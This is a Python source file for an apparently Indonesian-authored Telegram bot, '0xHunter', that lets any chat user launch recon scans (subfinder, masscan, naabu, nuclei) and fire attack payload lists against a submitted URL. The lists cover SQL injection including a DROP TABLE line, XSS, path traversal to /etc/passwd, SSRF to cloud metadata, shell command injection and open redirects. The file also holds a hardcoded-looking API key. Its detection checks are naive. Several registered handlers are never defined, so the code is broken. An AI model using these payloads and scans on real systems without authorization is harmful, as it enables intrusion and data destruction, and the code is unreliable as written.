#!/usr/bin/env python3
# 0xhunter.py - Telegram Bot untuk Deteksi Celah Keamanan & Recon Otomatis
# Author: Izumy

import os
import requests
import urllib.parse
import subprocess
from datetime import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# ===== KONFIGURASI =====
try:
    from config import TOKEN, CHAOS_API_KEY
except ImportError:
    TOKEN = "telegram bot id"
    CHAOS_API_KEY = "07ecfd53-004e-4dab-b018-373"

# ===== PAYLOAD UMUM =====
PAYLOADS = {
    "sqli": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "'; DROP TABLE users; --",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "' UNION SELECT NULL, NULL, NULL--",
        "' AND 1=1--",
        "' AND 1=2--",
        "' WAITFOR DELAY '0:0:5'--",
        "' OR SLEEP(5)--"
    ],
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "'><script>alert(1)</script>",
        "javascript:alert('XSS')",
        "\"><script>alert(1)</script>",
        "';alert(1)//"
    ],
    "lfi": [
        "../../../../etc/passwd",
        "../../../../etc/hosts",
        "../../../../windows/win.ini",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//etc/passwd"
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8080/admin",
        "http://127.0.0.1:22",
        "http://127.0.0.1:80"
    ],
    "rce": [
        "; ls",
        "| ls",
        "&& ls",
        "`ls`",
        "$(ls)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "&& cat /etc/passwd"
    ],
    "openredirect": [
        "//evil.com",
        "https://evil.com",
        "http://evil.com",
        "//www.google.com",
        "https://google.com"
    ]
}

# ===== FUNGSI DETEKSI =====
def test_payloads(url, param, payloads, category):
    """Tes payload pada parameter URL"""
    findings = []
    for payload in payloads:
        try:
            encoded = urllib.parse.quote(payload)
            test_url = url.replace(f"={param}", f"={encoded}")
            
            resp = requests.get(test_url, timeout=5, allow_redirects=False)
            
            if category == "sqli":
                if any(x in resp.text.lower() for x in ["sql", "mysql", "postgresql", "oracle", "sybase", "error"]):
                    findings.append(f"🚨 SQLi: {payload}")
            elif category == "xss":
                if "alert" in resp.text or "script" in resp.text:
                    findings.append(f"🚨 XSS: {payload}")
            elif category == "lfi":
                if any(x in resp.text for x in ["root:x:0:0", "[boot loader]", "[fonts]"]):
                    findings.append(f"🚨 LFI: {payload}")
            elif category == "ssrf":
                if "meta-data" in resp.text or "localhost" in resp.text:
                    findings.append(f"🚨 SSRF: {payload}")
            elif category == "rce":
                if "uid=" in resp.text or "root" in resp.text or "www-data" in resp.text:
                    findings.append(f"🚨 RCE: {payload}")
            elif category == "openredirect":
                if "evil.com" in resp.text or "google.com" in resp.text:
                    findings.append(f"🚨 Open Redirect: {payload}")
                    
        except Exception:
            continue
    return findings

async def scan_target(update: Update, context: ContextTypes.DEFAULT_TYPE, categories=None):
    """Fungsi utama scan"""
    if not context.args:
        await update.message.reply_text("❌ Pakai: /scan <url>")
        return
    
    url = context.args[0]
    await update.message.reply_text(f"🔍 Scanning `{url}`... ini mungkin memakan waktu.", parse_mode="Markdown")
    
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    
    if not params:
        await update.message.reply_text("❌ URL tidak memiliki parameter. Contoh: /scan https://example.com?id=1")
        return
    
    all_findings = []
    for param in params.keys():
        for category, payloads in PAYLOADS.items():
            if categories and category not in categories:
                continue
            findings = test_payloads(url, param, payloads, category)
            all_findings.extend(findings)
    
    if all_findings:
        report = "\n".join(all_findings[:20])
        await update.message.reply_text(
            f"📋 *Temuan Celah:*\n```\n{report}\n```\n*Total: {len(all_findings)} temuan*",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("✅ Tidak ada celah yang terdeteksi dari payload standar.", parse_mode="Markdown")

# ===== HANDLER PERINTAH =====
async def full_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /scan - Full scan semua kategori"""
    await scan_target(update, context)

async def sqli_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /sqli - khusus SQLi"""
    await scan_target(update, context, categories=["sqli"])

async def xss_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /xss - khusus XSS"""
    await scan_target(update, context, categories=["xss"])

async def lfi_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /lfi - khusus LFI"""
    await scan_target(update, context, categories=["lfi"])

async def ssrf_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /ssrf - khusus SSRF"""
    await scan_target(update, context, categories=["ssrf"])

async def rce_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /rce - khusus RCE"""
    await scan_target(update, context, categories=["rce"])

async def openredirect_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /openredirect - khusus Open Redirect"""
    await scan_target(update, context, categories=["openredirect"])

# ===== FITUR RECON & SCANNING LANJUTAN =====

async def subdomainizer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /subdomainizer - Gabungan Assetfinder + Subfinder"""
    if not context.args:
        await update.message.reply_text("❌ Pakai: /subdomainizer <domain>")
        return
    
    domain = context.args[0]
    await update.message.reply_text(f"🔍 Mencari subdomain untuk `{domain}`...", parse_mode="Markdown")
    
    try:
        af_result = subprocess.run(
            ["assetfinder", "--subs-only", domain],
            capture_output=True, text=True, timeout=30
        )
        sf_result = subprocess.run(
            ["subfinder", "-d", domain, "-silent"],
            capture_output=True, text=True, timeout=30
        )
        
        subs = set()
        if af_result.returncode == 0:
            subs.update(af_result.stdout.strip().split('\n'))
        if sf_result.returncode == 0:
            subs.update(sf_result.stdout.strip().split('\n'))
        
        subs = [s for s in subs if s.strip()]
        
        if subs:
            sample = "\n".join(subs[:50])
            total = len(subs)
            await update.message.reply_text(
                f"📋 *Ditemukan {total} subdomain:*\n```\n{sample}\n```\n*(Menampilkan 50 pertama)*",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text("❌ Tidak ada subdomain ditemukan.", parse_mode="Markdown")
    
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def subfinder_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /subfinder - Subdomain discovery"""
    if not context.args:
        await update.message.reply_text("❌ Pakai: /subfinder <domain>")
        return
    
    domain = context.args[0]
    await update.message.reply_text(f"🔍 Mencari subdomain dengan Subfinder...", parse_mode="Markdown")
    
    try:
        result = subprocess.run(
            ["subfinder", "-d", domain, "-silent"],
            capture_output=True, text=True, timeout=30
        )
        
        if result.returncode == 0 and result.stdout.strip():
            subs = result.stdout.strip().split('\n')
            sample = "\n".join(subs[:50])
            total = len(subs)
            await update.message.reply_text(
                f"📋 *Ditemukan {total} subdomain:*\n```\n{sample}\n```\n*(Menampilkan 50 pertama)*",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text("❌ Subfinder gagal.", parse_mode="Markdown")
    
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def chaos_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /chaos - Chaos subdomain database"""
    if not context.args:
        await update.message.reply_text("❌ Pakai: /chaos <domain>")
        return
    
    domain = context.args[0]
    await update.message.reply_text(f"🔍 Mengambil subdomain dari Chaos database...", parse_mode="Markdown")
    
    try:
        result = subprocess.run(
            ["chaos", "-d", domain, "-silent", "-key", CHAOS_API_KEY],
            capture_output=True, text=True, timeout=30
        )
        
        if result.returncode == 0 and result.stdout.strip():
            subs = result.stdout.strip().split('\n')
            sample = "\n".join(subs[:50])
            total = len(subs)
            await update.message.reply_text(
                f"📋 *Ditemukan {total} subdomain dari Chaos:*\n```\n{sample}\n```\n*(Menampilkan 50 pertama)*",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text("❌ Chaos gagal. Pastikan API key benar dan terinstall.", parse_mode="Markdown")
    
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def crtsh_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /crtsh - Subdomain dari crt.sh database"""
    if not context.args:
        await update.message.reply_text("❌ Pakai: /crtsh <domain>")
        return
    
    domain = context.args[0]
    await update.message.reply_text(f"🔍 Mengambil subdomain dari crt.sh...", parse_mode="Markdown")
    
    try:
        url = f"https://crt.sh/?q={domain}&output=json"
        resp = requests.get(url, timeout=30)
        
        if resp.status_code == 200:
            data = resp.json()
            subs = set()
            for entry in data:
                name = entry.get('name_value', '')
                if name:
                    for sub in name.split('\n'):
                        sub = sub.strip().lower()
                        if sub.endswith(domain) and sub != domain:
                            subs.add(sub)
            
            if subs:
                sample = "\n".join(list(subs)[:50])
                await update.message.reply_text(
                    f"📋 *Ditemukan {len(subs)} subdomain dari crt.sh:*\n```\n{sample}\n```\n*(Menampilkan 50 pertama)*",
                    parse_mode="Markdown"
                )
            else:
                await update.message.reply_text("❌ Tidak ada subdomain ditemukan di crt.sh.", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ Gagal mengambil data dari crt.sh.", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def masscan_port(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /masscan - Port scanner cepat"""
    if not context.args:
        await update.message.reply_text("❌ Pakai: /masscan <target>")
        return
    
    target = context.args[0]
    await update.message.reply_text(f"🔍 Menjalankan Masscan pada `{target}`...\n*Ini cepat, tapi bisa memakan waktu.*", parse_mode="Markdown")
    
    try:
        result = subprocess.run(
            ["masscan", target, "-p1-1000", "--rate=1000", "-oL", "-"],
            capture_output=True, text=True, timeout=60
        )
        
        if result.returncode == 0 and result.stdout.strip():
            ports = []
            for line in result.stdout.strip().split('\n'):
                if "open" in line:
                    parts = line.split()
                    if len(parts) >= 4:
                        ports.append(parts[3])
            
            if ports:
                ports_str = ", ".join(ports)
                await update.message.reply_text(
                    f"📋 *Open Ports:*\n```\n{ports_str}\n```",
                    parse_mode="Markdown"
                )
            else:
                await update.message.reply_text("❌ Tidak ada port terbuka.", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ Masscan gagal. Pastikan terinstall.", parse_mode="Markdown")
    
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def naabu_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /naabu - Port scanner cepat (Naabu)"""
    if not context.args:
        await update.message.reply_text("❌ Pakai: /naabu <target>")
        return
    
    target = context.args[0]
    await update.message.reply_text(f"🔍 Menjalankan Naabu scan pada `{target}`...", parse_mode="Markdown")
    
    try:
        result = subprocess.run(
            ["naabu", "-host", target, "-p", "1-1000", "-rate", "1000", "-silent"],
            capture_output=True, text=True, timeout=60
        )
        
        if result.returncode == 0 and result.stdout.strip():
            ports = result.stdout.strip().split('\n')
            ports = [p.strip() for p in ports if p.strip()]
            
            if ports:
                ports_str = ", ".join(ports)
                await update.message.reply_text(
                    f"📋 *Open Ports (Naabu):*\n```\n{ports_str}\n```",
                    parse_mode="Markdown"
                )
            else:
                await update.message.reply_text("❌ Tidak ada port terbuka.", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ Naabu gagal. Pastikan terinstall.", parse_mode="Markdown")
    
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def nuclei_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /nuclei - Vulnerability scanner"""
    if not context.args:
        await update.message.reply_text("❌ Pakai: /nuclei <target>")
        return
    
    target = context.args[0]
    await update.message.reply_text(f"🔍 Menjalankan Nuclei pada `{target}`...\n*Ini bisa memakan waktu.*", parse_mode="Markdown")
    
    try:
        subprocess.run(["nuclei", "-update-templates"], capture_output=True, text=True, timeout=60)
        
        result = subprocess.run(
            ["nuclei", "-u", target, "-severity", "medium,high,critical", "-silent"],
            capture_output=True, text=True, timeout=120
        )
        
        if result.returncode == 0 and result.stdout.strip():
            await update.message.reply_text(
                f"📋 *Nuclei Findings (Medium/High/Critical):*\n```\n{result.stdout.strip()[:4000]}\n```",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text("✅ Tidak ada temuan dari Nuclei.", parse_mode="Markdown")
    
    except subprocess.TimeoutExpired:
        await update.message.reply_text("⏱️ Nuclei scan timeout (120 detik).", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def httpx_probe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /httpx - HTTP probe"""
    if not context.args:
        await update.message.reply_text("❌ Pakai: /httpx <url>")
        return
    
    url = context.args[0]
    await update.message.reply_text(f"🔍 Probing `{url}` dengan httpx...", parse_mode="Markdown")
    
    try:
        result = subprocess.run(
            ["httpx", "-u", url, "-silent", "-status-code", "-title", "-server", "-tech-detect"],
            capture_output=True, text=True, timeout=30
        )
        
        if result.returncode == 0 and result.stdout.strip():
            await update.message.reply_text(
                f"📋 *httpx Result:*\n```\n{result.stdout.strip()}\n```",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text("❌ httpx gagal atau tidak ada response.", parse_mode="Markdown")
    
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def dnsx_enum(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /dnsx - DNS enumeration"""
    if not context.args:
        await update.message.reply_text("❌ Pakai: /dnsx <domain>")
        return
    
    domain = context.args[0]
    await update.message.reply_text(f"🔍 DNS enumeration untuk `{domain}`...", parse_mode="Markdown")
    
    try:
        result = subprocess.run(
            ["dnsx", "-a", "-aaaa", "-mx", "-ns", "-txt", "-cname", "-silent", "-domain", domain],
            capture_output=True, text=True, timeout=30
        )
        if result.returncode == 0 and result.stdout.strip():
            await update.message.reply_text(f"📋 *DNS Records:*\n```\n{result.stdout.strip()}\n```", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ DNSx gagal atau tidak ada record.", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def subzy_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /subzy - Subdomain takeover check"""
    if not context.args:
        await update.message.reply_text("❌ Pakai: /subzy <domain>")
        return
    
    domain = context.args[0]
    await update.message.reply_text(f"🔍 Cek subdomain takeover untuk `{domain}`...", parse_mode="Markdown")
    
    try:
        result = subprocess.run(
            ["subzy", "run", "--targets", domain, "--hide_fails", "--verify_ssl"],
            capture_output=True, text=True, timeout=60
        )
        if result.returncode == 0 and result.stdout.strip():
            await update.message.reply_text(f"📋 *Subzy Results:*\n```\n{result.stdout.strip()}\n```", parse_mode="Markdown")
        else:
            await update.message.reply_text("✅ Tidak ada subdomain takeover yang terdeteksi.", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def wayback_urls(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /waybackurls - Wayback Machine URLs"""
    if not context.args:
        await update.message.reply_text("❌ Pakai: /waybackurls <domain>")
        return
    
    domain = context.args[0]
    await update.message.reply_text(f"🔍 Mengambil URL historis dari Wayback Machine...", parse_mode="Markdown")
    
    try:
        result = subprocess.run(["waybackurls", domain], capture_output=True, text=True, timeout=30)
        if result.returncode == 0 and result.stdout.strip():
            urls = result.stdout.strip().split('\n')
            sample = "\n".join(urls[:20])
            await update.message.reply_text(f"📋 *Ditemukan {len(urls)} URL dari Wayback Machine:*\n```\n{sample}\n```\n*(Menampilkan 20 pertama)*", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ Waybackurls gagal.", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def wayback_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /wayback - Wayback Machine URLs (alias)"""
    if not context.args:
        await update.message.reply_text("❌ Pakai: /wayback <domain>")
        return
    
    domain = context.args[0]
    await update.message.reply_text(f"🔍 Mengambil URL historis dari Wayback Machine...", parse_mode="Markdown")
    
    try:
        result = subprocess.run(["waybackurls", domain], capture_output=True, text=True, timeout=30)
        if result.returncode == 0 and result.stdout.strip():
            urls = result.stdout.strip().split('\n')
            sample = "\n".join(urls[:20])
            await update.message.reply_text(
                f"📋 *Ditemukan {len(urls)} URL dari Wayback Machine:*\n```\n{sample}\n```\n*(Menampilkan 20 pertama)*",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text("❌ Wayback gagal. Pastikan waybackurls terinstall.", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def github_subdomains(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /github-subdomains"""
    if not context.args:
        await update.message.reply_text("❌ Pakai: /github-subdomains <domain>")
        return
    
    domain = context.args[0]
    await update.message.reply_text(f"🔍 Mencari subdomain dari GitHub untuk `{domain}`...", parse_mode="Markdown")
    
    try:
        result = subprocess.run(
            ["python3", "github-subdomains/github-subdomains.py", "-d", domain],
            capture_output=True, text=True, timeout=60
        )
        if result.returncode == 0 and result.stdout.strip():
            await update.message.reply_text(f"📋 *GitHub Subdomains:*\n```\n{result.stdout.strip()}\n```", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ GitHub subdomains gagal atau tidak ada temuan.", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def screenshot_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /screenshot - Ambil screenshot website"""
    if not context.args:
        await update.message.reply_text("❌ Pakai: /screenshot <url>")
        return
    
    url = context.args[0]
    await update.message.reply_text(f"📸 Mengambil screenshot dari `{url}`...", parse_mode="Markdown")
    
    try:
        result = subprocess.run(["gowitness", "single", url, "-o", "screenshot.png"], capture_output=True, text=True, timeout=30)
        if result.returncode == 0 and os.path.exists("screenshot.png"):
            await update.message.reply_photo(photo=open("screenshot.png", 'rb'), caption=f"📸 Screenshot dari {url}")
            os.remove("screenshot.png")
        else:
            await update.message.reply_text("❌ Gowitness gagal atau tidak ada screenshot.", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def generate_report(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /report - Generate laporan lengkap bug bounty"""
    if not context.args:
        await update.message.reply_text("❌ Pakai: /report <url>")
        return
    
    url = context.args[0]
    await update.message.reply_text(f"📄 Men-generate laporan lengkap untuk `{url}`... Mohon tunggu.", parse_mode="Markdown")
    
    try:
        domain = urllib.parse.urlparse(url).netloc
        
        # Subdomain scan
        subs = set()
        try:
            af_result = subprocess.run(["assetfinder", "--subs-only", domain], capture_output=True, text=True, timeout=30)
            sf_result = subprocess.run(["subfinder", "-d", domain, "-silent"], capture_output=True, text=True, timeout=30)
            if af_result.returncode == 0:
                subs.update(af_result.stdout.strip().split('\n'))
            if sf_result.returncode == 0:
                subs.update(sf_result.stdout.strip().split('\n'))
        except:
            pass
        
        # Port scan dengan Naabu
        ports = []
        try:
            naabu_result = subprocess.run(["naabu", "-host", domain, "-p", "1-1000", "-rate", "1000", "-silent"], capture_output=True, text=True, timeout=60)
            if naabu_result.returncode == 0 and naabu_result.stdout.strip():
                ports = [p.strip() for p in naabu_result.stdout.strip().split('\n') if p.strip()]
        except:
            pass
        
        # Vulnerability scan dengan Nuclei
        nuclei_results = "Tidak ada temuan atau scan timeout."
        try:
            subprocess.run(["nuclei", "-update-templates"], capture_output=True, text=True, timeout=60)
            nuclei_result = subprocess.run(["nuclei", "-u", url, "-severity", "medium,high,critical", "-silent"], capture_output=True, text=True, timeout=120)
            if nuclei_result.returncode == 0 and nuclei_result.stdout.strip():
                nuclei_results = nuclei_result.stdout.strip()[:3000]
        except:
            pass
        
        # HTTP probe
        httpx_info = "Gagal."
        try:
            httpx_result = subprocess.run(["httpx", "-u", url, "-silent", "-status-code", "-title", "-server", "-tech-detect"], capture_output=True, text=True, timeout=30)
            if httpx_result.returncode == 0 and httpx_result.stdout.strip():
                httpx_info = httpx_result.stdout.strip()
        except:
            pass
        
        # Buat laporan
        report = f"""
📋 *BUG BOUNTY REPORT - {domain}*
====================================

🔍 *Subdomain Ditemukan:*
{len(subs)} subdomain ditemukan.
{subs if subs else "Tidak ada subdomain ditemukan."}

🌐 *Open Ports:*
{", ".join(ports) if ports else "Tidak ada port terbuka."}

🛡️ *Nuclei Findings:*
{nuclei_results}

📊 *HTTP Probe:*
{httpx_info}

📌 *Catatan:* Laporan ini dihasilkan otomatis oleh bot.
"""
        await update.message.reply_text(report, parse_mode="Markdown")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def export_report(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /export - Simpan laporan ke file"""
    if not context.args:
        await update.message.reply_text("❌ Pakai: /export <url>")
        return
    
    url = context.args[0]
    await update.message.reply_text(f"📄 Menyimpan laporan untuk `{url}`...", parse_mode="Markdown")
    
    try:
        domain = urllib.parse.urlparse(url).netloc
        filename = f"reports/report_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        os.makedirs("reports", exist_ok=True)
        
        report = f"""
BUG BOUNTY REPORT - {domain}
Generated by 0xHunter
====================================

Target: {url}
Domain: {domain}
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

---
This report was generated for educational purposes only.
"""
        with open(filename, 'w') as f:
            f.write(report)
        
        await update.message.reply_document(document=open(filename, 'rb'), caption=f"📄 Laporan {domain}")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def status_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /status"""
    await update.message.reply_text("✅ 0xHunter aktif. Siap hunting celah! 💀🔥", parse_mode="Markdown")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /help"""
    help_text = """
🛠 *Perintah 0xHunter:*

🔍 *Reconnaissance:*
/subdomainizer <domain>
/subfinder <domain>
/chaos <domain>
/crtsh <domain>
/masscan <target>
/naabu <target>
/httpx <url>
/dnsx <domain>
/waybackurls <domain>
/wayback <domain>
/github-subdomains <domain>
/vhost <domain>

🛡️ *Vulnerability Scanning:*
/nuclei <target>
/scan <url>
/detect <url>
/sqli <url>
/xss <url>
/lfi <url>
/ssrf <url>
/rce <url>
/openredirect <url>

🎯 *Actionable Intelligence:*
/takeover <domain>
/js <url>
/cors <url>
/s3 <domain>
/cloud <domain>
/waf <url>
/archive <url>

📸 *Screenshot & Report:*
/screenshot <url>
/report <url>
/export <url>

📌 *Gunakan hanya untuk target yang diizinkan.*
"""
    await update.message.reply_text(help_text, parse_mode="Markdown")

# ===== MAIN =====
def main():
    application = ApplicationBuilder().token(TOKEN).build()
    
    # Register all handlers
    application.add_handler(CommandHandler("start", help_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("scan", full_scan))
    application.add_handler(CommandHandler("detect", full_scan))
    application.add_handler(CommandHandler("sqli", sqli_test))
    application.add_handler(CommandHandler("xss", xss_test))
    application.add_handler(CommandHandler("lfi", lfi_test))
    application.add_handler(CommandHandler("ssrf", ssrf_test))
    application.add_handler(CommandHandler("rce", rce_test))
    application.add_handler(CommandHandler("openredirect", openredirect_test))
    application.add_handler(CommandHandler("subdomainizer", subdomainizer))
    application.add_handler(CommandHandler("subfinder", subfinder_scan))
    application.add_handler(CommandHandler("chaos", chaos_scan))
    application.add_handler(CommandHandler("crtsh", crtsh_scan))
    application.add_handler(CommandHandler("masscan", masscan_port))
    application.add_handler(CommandHandler("naabu", naabu_scan))
    application.add_handler(CommandHandler("nuclei", nuclei_scan))
    application.add_handler(CommandHandler("httpx", httpx_probe))
    application.add_handler(CommandHandler("dnsx", dnsx_enum))
    application.add_handler(CommandHandler("subzy", subzy_check))
    application.add_handler(CommandHandler("waybackurls", wayback_urls))
    application.add_handler(CommandHandler("wayback", wayback_scan))
    application.add_handler(CommandHandler("github-subdomains", github_subdomains))
    application.add_handler(CommandHandler("screenshot", screenshot_url))
    application.add_handler(CommandHandler("report", generate_report))
    application.add_handler(CommandHandler("export", export_report))
    application.add_handler(CommandHandler("status", status_bot))
    application.add_handler(CommandHandler("takeover", takeover_check))
    application.add_handler(CommandHandler("js", js_scanner))
    application.add_handler(CommandHandler("vhost", vhost_check))
    application.add_handler(CommandHandler("cors", cors_check))
    application.add_handler(CommandHandler("s3", s3_check))
    application.add_handler(CommandHandler("cloud", cloud_check))
    application.add_handler(CommandHandler("waf", waf_check))
    application.add_handler(CommandHandler("archive", archive_check))
    
    print("🔥 0xHunter aktif...")
    application.run_polling()

if __name__ == "__main__":
    main()
